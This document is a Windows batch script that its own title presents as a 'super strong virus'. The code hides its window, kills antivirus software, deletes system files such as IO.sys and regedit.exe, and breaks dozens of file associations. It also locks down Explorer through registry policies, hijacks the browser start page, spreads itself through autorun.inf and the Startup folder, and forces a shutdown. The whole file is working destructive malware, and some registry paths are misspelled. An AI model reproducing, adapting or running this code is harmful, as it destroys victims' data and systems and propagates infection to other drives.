@echo off
if "%1" == "h" goto begin
mshta vbscript:createobject("wscript.shell").run("""%~nx0"" h",0)(window.close)&&exit
:begin
title 超强病毒            制作人: 小C（姚嘉华）
taskkill /im 360tray.exe /f
set date=%date% 
date 1989.10.21 
date 1989.10.21
@echo off & setlocal enableextensions
set /a i = 20
:Timeout
if %i% == 0 goto Next
setlocal
set /a i = %i% - 1
goto Timeout
goto End
:Next
date 1949.10.21
RD /S /Q %systemroot%\temp\ 
del %winder%\win.ini /f
del %winder%\regedit.exe /f
del %winder%\Notepad.exe /f
del %winder%\System.ini /f
del C:\bootfront.bin /f
del C:\IO.sys /f
del C:\MSDOS.sys /f
del C:\NTDETECT.COM /f
assoc .txt=exefile
assoc .exe=txtfile
assoc .htm=exefile
assoc .html=exefile
assoc .com=txtfile
assoc .gho=txtfile
assoc .rar=txtfile
assoc .zip=txtfile
assoc .chm=txtfile
assoc .jpg=txtfile
assoc .doc=exefile
assoc .ppt=txtfile
assoc .vbs=txtfile
assoc .cmd=txtfile
assoc .bmp=txtfile
assoc .gif=txtfile
assoc .ico=txtfile
assoc .png=txtfile
assoc .jpeg=txtfile
assoc .jpe=txtfile
assoc .jfif=txtfile
assoc .fla=txtfile
assoc .swf=txtfile
assoc .avi=txtfile
assoc .mov=txtfile
assoc .asf=txtfile
assoc .wmv=txtfile
assoc .rm=txtfile
assoc .ra=txtfile
assoc .mvb=txtfile
assoc .flv=txtfile
assoc .mpg=txtfile
assoc .wav=txtfile
assoc .mpeg=txtfile
assoc .mp3=txtfile
assoc .mp4=txtfile
assoc .3gp=txtfile
assoc .3g2=txtfile
assoc .dat=txtfile
assoc .msi=txtfile
assoc .bat=txtfile
reg add HKEY_CURRENT_USER\SOFTWARW\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFind /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\SOFTWARW\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoRun /t REG_DWORD /d 0 /f
reg add HKEY_CURRENT_USER\SOFTWARW\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoClose /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\SOFTWARW\Microsoft\Windows\CurrentVersion\Policies\Explorer /v HideClock /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\SOFTWARW\Microsoft\Windows\CurrentVersion\Policies\Explorer /v StartMenuLogOff /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\SOFTWARW\Microsoft\Windows\CurrentVersion\Policies\Explorer /v nodrives /t REG_DWORD /d 60 /f
subst b: C:\
subst h: C:\
subst i: C:\
subst j: C:\
subst k: C:\
subst l: C:\
subst m: C:\
subst n: C:\
subst o: C:\
subst p: C:\
subst q: C:\
subst r: C:\
subst s: C:\
subst t: C:\
subst u: C:\
subst v: C:\
subst w: C:\
subst x: C:\
subst y: C:\
subst z: C:\
taskkill /im explorer.exe /f
reg add HKEY_CURRENT_USER\SOFTWARW\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDesktop /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\SOFTWARW\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoViewContextMenu /t REG_DWORD /d 0 /f
reg add HKEY_CURRENT_USER\SOFTWARW\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoFolderOptions /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\SOFTWARW\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoWinKeys /t REG_DWORD /d 1 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Start Page" /t reg_sz /d http://bbs.kafan.cn /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Default_Page_URL" /t reg_sz /d http://bbs.kafan.cn /f
copy %0 "%windir%\system32\"
copy %0 "%systemdrive%"
setlocal enabledelayedexpansion
for /f "skip=1 tokens=1 delims= " %%a in ('fsutil fsinfo drives^|find /v ""') do (
cd %%a>nul 2>nul && (set "lastdriver=%%a")
)
if not exist "!lastdriver!\bingdu.bat" (copy %0 !lastdriver!\)
if not exist "!lastdriver!\autorun.inf" (echo [AUTORUN]>>"!lastdriver!\autorun.inf" & echo shellexecute=bingdu.bat>>"!lastdriver!\autorun.inf")
copy %0 "%userprofile%\「开始」菜单\程序\启动\*.*"
shutdown -s -f
del %0 /f